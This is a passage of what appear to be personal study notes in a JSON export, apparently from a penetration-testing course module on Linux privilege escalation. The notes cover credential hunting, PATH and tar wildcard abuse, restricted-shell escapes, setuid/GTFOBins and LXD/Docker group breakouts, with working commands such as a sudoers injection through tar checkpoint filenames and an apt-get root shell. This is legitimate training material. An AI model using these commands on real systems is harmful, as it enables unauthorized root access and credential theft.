21680 ?        Ssl  12:31   0:00 /usr/sbin/NetworkManager --no-daemon\nroot         790  0.0  0.0  81932  3648 ?        Ssl  12:31   0:00 /usr/sbin/irqbalance --foreground\nroot         792  0.1  0.5  48244 20540 ?        Ss   12:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers\nroot         793  1.3  0.2 239180 11832 ?        Ssl  12:31   0:00 /usr/lib/policykit-1/polkitd --no-debug\nroot         806  2.1  1.1 1096292 44976 ?       Ssl  12:31   0:01 /usr/lib/snapd/snapd\nroot         807  0.0  0.1 244352  6516 ?        Ssl  12:31   0:00 /usr/libexec/switcheroo-control\nroot         811  0.1  0.2  17412  8112 ?        Ss   12:31   0:00 /lib/systemd/systemd-logind\nroot         817  0.0  0.3 396156 14352 ?        Ssl  12:31   0:00 /usr/lib/udisks2/udisksd\nroot         818  0.0  0.1  13684  4876 ?        Ss   12:31   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant\nroot         871  0.1  0.3 319236 13828 ?        Ssl  12:31   0:00 /usr/sbin/ModemManager\nroot         875  0.0  0.3 178392 12748 ?        Ssl  12:31   0:00 /usr/sbin/cups-browsed\nroot         889  0.1  0.5 126676 22888 ?        Ssl  12:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal\nroot         906  0.0  0.2 248244  8736 ?        Ssl  12:31   0:00 /usr/sbin/gdm3\nroot        1137  0.0  0.2 252436  9424 ?        Ssl  12:31   0:00 /usr/lib/upower/upowerd\nroot        1257  0.0  0.4 293736 16316 ?        Ssl  12:31   0:00 /usr/lib/packagekit/packagekitd\n```\n\n---\n\nThis would give us a pretty good overview of our target system, so we can go into more detail next and figure out the individual permissions for the components we found.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/05-Credential Hunting",
    "path": "02_CPTS/16-Linux Privilege Escalation/05-Credential Hunting.md",
    "title": "05 Credential Hunting",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nWhen enumerating a system, it is important to note down any credentials. These may be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, a user's bash history file, backup (`.bak`) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.\n\nThe /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files:\n\nCredential Hunting\n\n```shell-session\nhtb_student@NIX02:~$ grep 'DB_USER\\|DB_PASSWORD' wp-config.php\n\ndefine( 'DB_USER', 'wordpressuser' );\ndefine( 'DB_PASSWORD', 'WPadmin123!' );\n```\n\nThe spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).\n\nCredential Hunting\n\n```shell-session\nhtb_student@NIX02:~$  find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2>/dev/null\n\n/etc/ssh/ssh_config\n/etc/ssh/sshd_config\n/etc/python3/debian_config\n/etc/kbd/config\n/etc/manpath.config\n/boot/config-4.4.0-116-generic\n/boot/grub/i386-pc/configfile.mod\n/sys/devices/pci0000:00/0000:00:00.0/config\n/sys/devices/pci0000:00/0000:00:01.0/config\n<SNIP>\n```\n\n---\n\n## SSH Keys\n\nIt is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the `known_hosts` file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.\n\nCredential Hunting\n\n```shell-session\nhtb_student@NIX02:~$  ls ~/.ssh\n\nid_rsa  id_rsa.pub  known_hosts\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/06- Path Abuse",
    "path": "02_CPTS/16-Linux Privilege Escalation/06- Path Abuse.md",
    "title": "06  Path Abuse",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- PATH is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command w...",
    "category": "02_CPTS",
    "content": "\n\n---\n\n[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`. We can check the contents of the PATH variable by typing `env | grep PATH` or `echo $PATH`.\n\nPath Abuse\n\n```shell-session\nhtb_student@NIX02:~$ echo $PATH\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\n```\n\nCreating a script or program in a directory specified in the PATH will make it executable from any directory on the system.\n\nPath Abuse\n\n```shell-session\nhtb_student@NIX02:~$ pwd && conncheck \n\n/usr/local/sbin\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       \ntcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p\ntcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       \ntcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2    \n```\n\nAs shown below, the `conncheck` script created in `/usr/local/sbin` will still run when in the `/tmp` directory because it was created in a directory specified in the PATH.\n\nPath Abuse\n\n```shell-session\nhtb_student@NIX02:~$ pwd && conncheck \n\n/tmp\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       \ntcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p\ntcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       \ntcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2     \n```\n\nAdding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).\n\nPath Abuse\n\n```shell-session\nhtb_student@NIX02:~$ echo $PATH\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\n```\n\nPath Abuse\n\n```shell-session\nhtb_student@NIX02:~$ PATH=.:${PATH}\nhtb_student@NIX02:~$ export PATH\nhtb_student@NIX02:~$ echo $PATH\n\n.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\n```\n\nIn this example, we modify the path to run a simple `echo` command when the command `ls` is typed.\n\nPath Abuse\n\n```shell-session\nhtb_student@NIX02:~$ touch ls\nhtb_student@NIX02:~$ echo 'echo \"PATH ABUSE!!\"' > ls\nhtb_student@NIX02:~$ chmod +x ls\n```\n\nPath Abuse\n\n```shell-session\nhtb_student@NIX02:~$ ls\n\nPATH ABUSE!!\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/07-Wildcard Abuse",
    "path": "02_CPTS/16-Linux Privilege Escalation/07-Wildcard Abuse.md",
    "title": "07 Wildcard Abuse",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include: |Character|Significance| |---|---| |*|...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nA wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:\n\n|**Character**|**Significance**|\n|---|---|\n|`*`|An asterisk that can match any number of characters in a file name.|\n|`?`|Matches a single character.|\n|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|\n|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|\n|`-`|A hyphen within brackets will denote a range of characters.|\n\nAn example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:\n\nWildcard Abuse\n\n```shell-session\nhtb_student@NIX02:~$ man tar\n\n<SNIP>\nInformative output\n       --checkpoint[=N]\n              Display progress messages every Nth record (default 10).\n\n       --checkpoint-action=ACTION\n              Run ACTION on each checkpoint.\n```\n\nThe `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.\n\nConsider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.\n\nWildcard Abuse\n\n```shell-session\n#\n#\nmh dom mon dow command\n*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *\n```\n\nWe can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.\n\nWildcard Abuse\n\n```shell-session\nhtb-student@NIX02:~$ echo 'echo \"htb-student ALL=(root) NOPASSWD: ALL\" >> /etc/sudoers' > root.sh\nhtb-student@NIX02:~$ echo \"\" > \"--checkpoint-action=exec=sh root.sh\"\nhtb-student@NIX02:~$ echo \"\" > --checkpoint=1\n```\n\nWe can check and see that the necessary files were created.\n\nWildcard Abuse\n\n```shell-session\nhtb-student@NIX02:~$ ls -la\n\ntotal 56\ndrwxrwxrwt 10 root        root        4096 Aug 31 23:12 .\ndrwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..\n-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz\n-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1\n-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh\ndrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix\ndrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix\n-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh\n```\n\nOnce the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.\n\nWildcard Abuse\n\n```shell-session\nhtb-student@NIX02:~$ sudo -l\n\nMatching Defaults entries for htb-student on NIX02:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser htb-student may run the following commands on NIX02:\n    (root) NOPASSWD: ALL\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/08-Escaping Restricted Shells",
    "path": "02_CPTS/16-Linux Privilege Escalation/08-Escaping Restricted Shells.md",
    "title": "08 Escaping Restricted Shells",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to e...",
    "category": "02_CPTS",
    "content": "\n---\n\nA restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. Some common examples of restricted shells include the `rbash` shell in Linux and the \"Restricted-access Shell\" in Windows.\n\n#### RBASH\n\n[Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`) is a restricted version of the Bourne shell, a standard command-line interpreter in Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system.\n\n#### RKSH\n\n[Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`) is a restricted version of the Korn shell, another standard command-line interpreter. The `rksh` shell limits the user's ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.\n\n#### RZSH\n\n[Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`) is a restricted version of the Z shell and is the most powerful and flexible command-line interpreter. The `rzsh` shell limits the user's ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.\n\nFor example, administrators often use restricted shells in enterprise networks to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. By limiting the user's ability to execute specific commands or access certain directories, administrators can ensure that users cannot perform actions that could harm the system or compromise the network's security. Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user.\n\nImagine a company with a network of Linux servers hosting critical business applications and services. Many users, including employees, contractors, and external partners, access the network. To protect the security and integrity of the network, the organization's IT team decided to implement restricted shells for all users.\n\nTo do this, the IT team sets up several `rbash`, `rksh`, and `rzsh` shells on the network and assigns each user to a specific shell. For example, external partners who need to access only certain network features, such as email and file sharing, are assigned to `rbash` shells, which limits their ability to execute specific commands and access certain directories. Contractors who need to access more advanced network features, such as database servers and web servers, are assigned to `rksh` shells, which provide them with more flexibility but still limit their abilities. Finally, employees who need to access the network for specific purposes, such as to run specific applications or scripts, are assigned to `rzsh` shells, which provide them with the most flexibility but still limit their ability to execute specific commands and access certain directories.\n\nSeveral methods can be used to escape from a restricted shell. Some of these methods involve exploiting vulnerabilities in the shell itself, while others involve using creative techniques to bypass the restrictions imposed by the shell. Here are a few examples of methods that can be used to escape from a restricted shell.\n\n---\n\n## Escaping\n\nIn some cases, it may be possible to escape from a restricted shell by injecting commands into the command line or other inputs the shell accepts. For example, suppose the shell allows users to execute commands by passing them as arguments to a built-in command. In that case, it may be possible to escape from the shell by injecting additional commands into the argument.\n\n#### Command injection\n\nImagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the `ls` command. Unfortunately, the shell only allows us to execute the `ls` command with a specific set of arguments, such as `ls -l` or `ls -a`, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the `ls` command.\n\nFor example, we could use the following command to inject a `pwd` command into the argument of the `ls` command:\n\nEscaping Restricted Shells\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -l `pwd` \n```\n\nThis command would cause the `ls` command to be executed with the argument `-l`, followed by the output of the `pwd` command. Since the `pwd` command is not restricted by the shell, this would allow us to execute the `pwd` command and see the current working directory, even though the shell does not allow us to execute the `pwd` command directly.\n\n#### Command Substitution\n\nAnother method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.\n\n#### Command Chaining\n\nIn some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (`;`) or a vertical bar (`|`), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.\n\n#### Environment Variables\n\nFor escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.\n\n#### Shell Functions\n\nIn some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/09-Special Permissions",
    "path": "02_CPTS/16-Linux Privilege Escalation/09-Special Permissions.md",
    "title": "09 Special Permissions",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears ...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nThe `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.\n\nSpecial Permissions\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null\n\n-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll\n-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll\n-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer\n-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount\n-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su\n-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount\n-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6\n-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount\n-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping\n-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g\n-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1\n-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine\n-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign\n-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device\n-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec\n-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp\n-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap\n-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn\n-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo\n-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh\n-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap\n-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd\n-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper\n-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0\n-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs\n```\n\nIt may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. Many programs have additional features that can be leveraged to execute commands and, if the `setuid` bit is set on them, these can be used for our purpose.\n\nThe Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. These files can be leveraged in the same manner as `setuid` binaries to escalate privileges.\n\nSpecial Permissions\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null\n\n-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine\n```\n\nThis [resource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) has more information about the `setuid` and `setgid` bits, including how to set the bits.\n\n---\n\n## GTFOBins\n\nThe [GTFOBins](https://gtfobins.github.io) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. For example, `apt-get` can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:\n\nSpecial Permissions\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nIt is worth familiarizing ourselves with as many GTFOBins as possible to quickly identify misconfigurations when we land on a system that we must escalate our privileges to move further.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/10-Privileged Groups",
    "path": "02_CPTS/16-Linux Privilege Escalation/10-Privileged Groups.md",
    "title": "10 Privileged Groups",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Privileged Groups --- LXC / LXD LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate pr...",
    "category": "02_CPTS",
    "content": "# Privileged Groups\n\n---\n\n## LXC / LXD\n\nLXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.\n\nPrivileged Groups\n\n```shell-session\ndevops@NIX02:~$ id\n\nuid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)\n```\n\nUnzip the Alpine image.\n\nPrivileged Groups\n\n```shell-session\ndevops@NIX02:~$ unzip alpine.zip \n\nArchive:  alpine.zip\nextracting: 64-bit Alpine/alpine.tar.gz  \ninflating: 64-bit Alpine/alpine.tar.gz.root  \ncd 64-bit\\ Alpine/\n```\n\nStart the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.\n\nPrivileged Groups\n\n```shell-session\ndevops@NIX02:~$ lxd init\n\nDo you want to configure a new storage pool (yes/no) [default=yes]? yes\nName of the storage backend to use (dir or zfs) [default=dir]: dir\nWould you like LXD to be available over the network (yes/no) [default=no]? no\nDo you want to configure the LXD bridge (yes/no) [default=yes]? yes\n\n/usr/sbin/dpkg-reconfigure must be run as root\nerror: Failed to configure the bridge\n```\n\nImport the local image.\n\nPrivileged Groups\n\n```shell-session\ndevops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\n\nGenerating a client certificate. This may take a minute...\nIf this is your first time using LXD, you should also run: sudo lxd init\nTo start your first container, try: lxc launch ubuntu:16.04\n\nImage imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b\n```\n\nStart a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.\n\nPrivileged Groups\n\n```shell-session\ndevops@NIX02:~$ lxc init alpine r00t -c security.privileged=true\n\nCreating r00t\n```\n\nMount the host file system.\n\nPrivileged Groups\n\n```shell-session\ndevops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true\n\nDevice mydev added to r00t\n```\n\nFinally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.\n\nPrivileged Groups\n\n```shell-session\ndevops@NIX02:~$ lxc start r00t\ndevops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh\n\n~ # id\nuid=0(root) gid=0(root)\n~ # \n```\n\n---\n\n## Docker\n\nPlacing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.\n\n---\n\n## Disk\n\nUsers within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.\n\n---\n\n## ADM\n\nMembers of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.\n\nPrivileged Groups\n\n```shell-session\nsecaudit@NIX02:~$ id\n\nuid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/11-Capabilities",
    "path": "02_CPTS/16-Linux Privilege Escalation/11-Capabilities.md",
    "title": "11 Capabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise b...",
    "category": "02_CPTS",
    "content": "\n---\n\nLinux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.\n\nHowever, like any security feature, Linux capabilities are not invulnerable and can be exploited by attackers. One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.\n\nAnother potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need. This can create unnecessary security risks, as we could exploit these privileges to gain access to sensitive information or perform unauthorized actions.\n\nOverall, Linux capabilities can be a practical security feature, but they must be used carefully and correctly to avoid vulnerabilities and potential exploits.\n\nSetting capabilities involves using the appropriate tools and commands to assign specific capabilities to executables or programs. In Ubuntu, for example, we can use the `setcap` command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.\n\nFor example, we could use the following command to set the `cap_net_bind_service` capability for an executable:\n\n#### Set Capability\n\nCapabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic\n```\n\nWhen capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the `cap_net_bind_service` capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.\n\nSome capabilities, such as `cap_sys_admin`, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. For example, we could exploit them to escalate their privileges, gain access to sensitive information, or perform unauthorized actions. Therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily.\n\n|**Capability**|**Description**|\n|---|---|\n|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|\n|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|\n|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|\n|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|\n|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|\n|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|\n|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|\n|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|\n\nWhen a binary is executed with capabilities, it can perform the actions that the capabilities allow. However, it will not be able to perform any actions not allowed by the capabilities. This allows for more fine-grained control over the binary's privileges and can help prevent security vulnerabilities and unauthorized access to sensitive information.\n\nWhen using the `setcap` command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. The values we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.\n\nHere are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:\n\n|**Capability Values**|**Description**|\n|---|---|\n|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|\n|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|\n|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|\n|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|\n\nSeveral Linux capabilities can be used to escalate a user's privileges to `root`, including:\n\n|**Capability**|**Description**|\n|---|---|\n|`cap_setuid`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|\n|`cap_setgid`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|\n|`cap_sys_admin`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|\n|`cap_dac_override`|Allows bypassing of file read, write, and execute permission checks.|\n\n---\n\n## Enumerating Capabilities\n\nIt is important to note that these capabilities should be used with caution and only granted to trusted processes, as they can be misused to gain unauthorized access to the system. To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:\n\n#### Enumerating Capabilities\n\nCapabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ find /usr/bin /usr/sbin 